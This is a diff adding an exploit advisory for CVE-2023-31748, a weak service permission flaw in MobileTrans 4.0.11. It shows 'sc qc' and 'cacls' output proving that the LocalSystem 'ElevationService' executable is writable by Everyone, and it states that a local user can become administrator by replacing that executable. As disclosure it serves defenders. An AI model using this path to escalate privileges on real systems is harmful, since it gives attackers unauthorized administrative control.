@@ -1,0 +1,53 @@
+# Exploit Title :MobileTrans  4.0.11 - Weak Service Privilege Escalation
+# Date: 20  May 2023
+# Exploit Author: Thurein Soe
+# Vendor Homepage: https://mobiletrans.wondershare.com/
+# Software Link:
+https://mega.nz/file/0Et0ybRS#l69LRlvwrwmqDfPGKl_HaJ5LmbeKJu_wH0xYKD8nSVg
+# Version: MobileTrans version 4.0.11
+# Tested on: Window 10 (Version 10.0.19045.2965)
+# CVE : CVE-2023-31748
+
+
+
+Vulnerability Description:
+
+MobileTrans is World 1 mobile-to-mobile file transfer
+application.MobileTrans version 4.0.11 was being suffered a weak service
+permission vulnerability that allows a normal window user to elevate to
+local admin. The "ElevationService" service name was installed, while the
+MobileTrans version 4.0.11 was installed in the window operating system.
+The service "ElevationService" allows the local user to elevate to the
+local admin as The "ElevationService" run with system privileges.
+Effectively, the local user is able to elevate to local admin upon
+successfully modifying the service or replacing the affected executable.
+
+C:\Users\HninKayThayar\Desktop>sc qc ElevationService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: ElevationService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files
+(x86)\Wondershare\MobileTrans\ElevationService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Wondershare Driver Install Service help
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\HninKayThayar\Desktop>cacls "C:\Program Files
+(x86)\Wondershare\MobileTrans\ElevationService.exe"
+C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe
+   Everyone:(ID)F
+                                                                    NT
+AUTHORITY\SYSTEM:(ID)F
+
+BUILTIN\Administrators:(ID)F
+
+BUILTIN\Users:(ID)R
+
+APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R
+
+APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R
